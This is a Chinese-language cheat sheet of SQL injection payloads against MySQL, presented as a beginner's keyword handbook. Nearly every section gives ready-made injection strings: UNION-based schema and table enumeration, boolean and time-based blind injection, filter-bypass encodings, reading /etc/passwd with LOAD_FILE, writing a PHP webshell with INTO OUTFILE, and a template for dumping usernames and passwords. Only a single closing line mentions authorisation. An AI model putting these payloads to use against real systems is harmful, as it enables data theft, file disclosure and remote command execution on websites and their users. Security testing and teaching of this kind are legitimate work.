# MySQL新手必备关键词手册

## 1. 信息模式（核心注入目标）
```sql
information_schema.schemata    -- 所有数据库信息
information_schema.tables      -- 所有表信息
information_schema.columns     -- 所有列信息

-- 查询所有数据库名
SELECT schema_name FROM information_schema.schemata

-- 注入示例：' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--+

-- 获取当前数据库所有表
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- 注入示例：' AND 1=2 UNION SELECT 1,table_name,3 FROM information_schema.tables--+

```

## 2. 数据查询关键词

```sql
SELECT * FROM users WHERE id=1      -- 基础查询
UNION SELECT 1,2,3                  -- 联合查询
LIMIT 0,1                           -- 结果限制
ORDER BY 4                          -- 排序（用于字段数判断）

-- 基础查询（判断字段数）
SELECT * FROM products WHERE id=1 ORDER BY 5

-- 注入示例：http://example.com/?id=1' ORDER BY 5--+

-- 联合查询（探测显示位）
SELECT name,price FROM products UNION SELECT 1,@@version

-- 注入示例：' UNION SELECT 1,@@version,3--+
```



## 3. 常用函数

```sql
CONCAT('a','b')             -- 字符串拼接（输出：ab）
GROUP_CONCAT(table_name)    -- 聚合拼接（表名1,表名2,...）
VERSION()                   -- 数据库版本信息
USER()                      -- 当前数据库用户
DATABASE()                  -- 当前数据库名
LOAD_FILE('/etc/passwd')    -- 读取系统文件
SLEEP(5)                    -- 延时函数（盲注使用）

-- 拼接管理员密码
SELECT CONCAT(username,0x3a,password) FROM admins

-- 注入示例：' UNION SELECT null,CONCAT(user(),0x3a,database()),null--+

-- 聚合表名（绕过LIMIT限制）
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables

-- 注入示例：' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
```



## 4. 特殊运算符

```sql
AND 1=1         -- 逻辑与运算
OR 1=2          -- 逻辑或运算
|| 'a'='a'      -- 逻辑或（部分环境可用）

-- 布尔逻辑测试
SELECT * FROM users WHERE id=1 AND 1=1

-- 注入示例：http://example.com/?id=1' AND 1=1--+
```



## 5. 注释方式

```sql
-- -             -- 末尾注释（注意空格）
#               -- 井号注释
/*!50530 ... */ -- 内联注释（版本特性检测）

-- 截断后续查询
SELECT * FROM products WHERE id=1' -- 

-- 注入示例：http://example.com/?id=1' AND 1=1--+

-- 内联注释绕过过滤
/*!SELECT*/ * FROM users

-- 注入示例：' UNION /*!SELECT*/ 1,version(),3--+
```



## 6. 系统变量

```sql
@@version        -- 数据库版本
@@datadir        -- 数据存储路径
@@hostname       -- 服务器主机名

-- 获取数据库版本
SELECT @@version

-- 注入示例：' UNION SELECT 1,@@version,3--+

-- 获取数据库路径
SELECT @@datadir

-- 注入示例：' UNION SELECT 1,@@datadir,3--+
```



## 7. 条件判断

```sql
IF(1=1, sleep(5), 0)  -- 条件判断（时间盲注）
CASE WHEN 1=1 THEN 1 ELSE 0 END -- 条件分支

-- 时间盲注检测
SELECT IF(1=1,SLEEP(5),0)

-- 注入示例：' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(5),0)--+

-- 布尔盲注判断
SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END

-- 注入示例：' AND CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END--+
```



## 8. 字符串处理

```sql
SUBSTR(str,1,1)     -- 截取子串（从第1位取1字符）
ASCII('a')          -- 获取ASCII码（97）
LENGTH(str)         -- 获取字符串长度
HEX('test')         -- 转换为十六进制

-- 逐字符猜解
SELECT SUBSTR((SELECT database()),1,1)

-- 注入示例：' AND ASCII(SUBSTR(database(),1,1))>97--+

-- 十六进制编码
SELECT 0x61646d696e -- 等价于 'admin'

-- 注入示例：' UNION SELECT 1,0x61646d696e,3--+
```



## 9. 文件操作

```sql
INTO OUTFILE '/tmp/test.txt'  -- 写入文件（需写权限）
LOAD DATA INFILE '/etc/passwd' -- 读取文件到表

-- 读取系统文件
SELECT LOAD_FILE('/etc/passwd')

-- 注入示例：' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--+

-- 写入Webshell
SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'

-- 注入示例：' UNION SELECT 1,'<?php system($_GET[cmd]);?>',3 INTO OUTFILE '/var/www/shell.php'--+
```



## 10. 权限相关

```sql
SHOW GRANTS                   -- 查看当前用户权限
FILE_PRIV                     -- 文件操作权限
SUPER_PRIV                    -- 超级用户权限

-- 系统命令执行（需特殊配置）：
sys_exec('whoami')           -- 通过UDF执行命令

-- 查看当前权限
SHOW GRANTS

-- 注入示例：' UNION SELECT 1,(SELECT GROUP_CONCAT(grantee,0x3a,privilege_type) FROM information_schema.user_privileges),3--+

-- 验证文件权限
SELECT file_priv FROM mysql.user WHERE user = 'root'

-- 注入示例：' AND (SELECT file_priv FROM mysql.user WHERE user='root' LIMIT 1)='Y'--+
```



## 11. 绕过过滤技巧

```sql
/*!UNION*/ SELECT            -- 内联注释绕过
SELselectECT                 -- 双写绕过
UNION%0bSELECT               -- 空白符绕过
CHAR(115,101,108,101,99,116) -- ASCII编码绕过


-- 大小写混合
SeLeCt VERSION()

-- 注入示例：' UnIoN SeLeCt 1,version(),3--+

-- 空白符绕过
SELECT/**/1FROM users

-- 注入示例：'%0bUNION%0cSELECT%0d1,2,3--+

-- 十六进制编码绕过
SELECT 0x756E696F6E -- 等价于 'union'

-- 注入示例：' 0x756E696F6E SELECT 1,2,3--+
```



## 12. 实用查询模板

```sql
-- 获取所有表名：
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables 
WHERE table_schema=database()

-- 获取列结构：
SELECT GROUP_CONCAT(column_name,':',data_type) 
FROM information_schema.columns WHERE table_name='users'

-- 拖库语句示例：
UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users
```

## 注意事项

所有测试需在授权环境进行